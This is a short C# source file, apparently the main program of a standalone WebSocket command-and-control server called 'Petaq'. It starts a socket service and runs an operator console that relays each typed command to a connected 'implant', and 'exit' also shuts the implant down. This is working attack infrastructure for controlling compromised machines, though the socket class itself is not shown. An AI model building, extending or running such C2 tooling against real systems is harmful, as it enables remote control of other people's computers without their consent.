using System;
using System.Text;

namespace Petaq_C2_Standalone
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("WebSocket C2 is starting...");
            
            // Start the websocket service 
            ServiceSocket sock = new ServiceSocket();
            sock.Start();

            // Command console
            Console.Write("# ");
            while (true) {
                string userinput = Console.ReadLine();

                if (userinput == "exit") {
                    sock.Send(Encoding.UTF8.GetBytes(userinput));
                    System.Environment.Exit(1);
                }

                if (sock.ClientSocket != null) {
                    sock.Send(Encoding.UTF8.GetBytes(userinput));
                }
                else {
                    Console.Write("No implant connected.\n# ");
                }

                
            }

        }
    }
}
